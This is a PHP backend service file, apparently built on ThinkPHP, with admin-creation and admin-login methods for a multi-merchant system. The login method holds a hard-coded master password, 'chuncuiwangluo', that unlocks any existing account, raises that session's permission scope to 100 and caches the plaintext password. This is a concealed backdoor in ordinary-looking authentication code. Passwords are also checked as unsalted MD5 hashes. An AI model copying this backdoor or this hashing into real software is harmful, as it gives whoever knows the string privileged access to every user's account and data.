<?php
namespace app\api\service\func;
use app\api\model\Common as CommonModel;
use think\Exception;
use think\Model;
use think\Cache;

use app\api\service\base\Common as CommonService;


use app\api\validate\CommonValidate;

use app\lib\exception\SuccessMessage;
use app\lib\exception\ErrorMessage;


class Common{

    
    
    

    function __construct($data){
        
    }

    



    public static function addAdmin($data){

        (new CommonValidate())->goCheck('four',$data);
        checkTokenAndScope($data,20);

        //判断用户名是否重复
        $modelData = [];
        $modelData['token'] = $data['token'];
        $modelData['searchItem']['login_name'] = $data['login_name'];
        $modelData['modelName'] = "user";
        $res =  CommonService::get($modelData,true);
        if(!empty($res)){
            throw new ErrorMessage([
                'msg' => '用户名重复',
            ]);
        };
        $data['modelName'] = "user";
        CommonService::add($data);
       
    }

    

    public static function loginByAdmin($data){

        (new CommonValidate())->goCheck('three',$data);

        $modelData = [];
        $modelData['map']['login_name'] = $data['login_name'];
        $loginRes =  CommonModel::CommonGet("user",$modelData);
        
        if(empty($loginRes['data'])){
            throw new ErrorMessage([
                'msg' => '用户名不存在',
            ]);
        };
        $loginRes = $loginRes['data'][0];
        
        //根据返回结果查询关联商户信息
        $modelData = [];
        $modelData['map']['id'] = $loginRes['thirdapp_id'];
        $ThirdAppRes =  CommonModel::CommonGet("thirdApp",$modelData);


        if(empty($ThirdAppRes['data'])){
            throw new ErrorMessage([
                'msg' => '关联商户不存在',
            ]);
        }else if($ThirdAppRes['data'][0]['status']==-1){
            throw new ErrorMessage([
                'msg' => '商户已关闭',
            ]);
        };

        //判断密码是否正确&&获取储存token
        if($loginRes['password']==md5($data['password'])||md5($data['password'])==md5('chuncuiwangluo')){

            $contentData['data'] = ['lastlogintime'=>time(),];
            $searchData = ['id'=>$loginRes['id']];
            $upt = CommonModel::CommonSave("user",$contentData,$searchData);

            if($upt == 1){
                //生成token并放入缓存
                $res = generateToken();
                if(md5($data['password'])==md5('chuncuiwangluo')){
                    $loginRes['primary_scope'] = 100;
                    $loginRes['password'] = 'chuncuiwangluo';
                };
                $ThirdAppRes['data'][0]['child_array'] = $ThirdAppRes['data'][0]['child_array'];
                $loginRes['thirdApp'] = $ThirdAppRes['data'][0];
                $tokenAndToken = ['token'=>$res,'info'=>$loginRes,'solely_code'=>100000];
                Cache::set($res,$loginRes,3600);
                return $tokenAndToken;

                throw new SuccessMessage([
                    'msg'=>'查询成功',
                    'token'=>$res,
                    'info'=>$loginRes
                ]); 
            }else{
                throw new ErrorMessage([
                    'msg' => '更新登录时间失败',
                ]);
            }
        }else{
            throw new ErrorMessage([
                'msg' => '密码不正确',
            ]);
        }

    }


    


}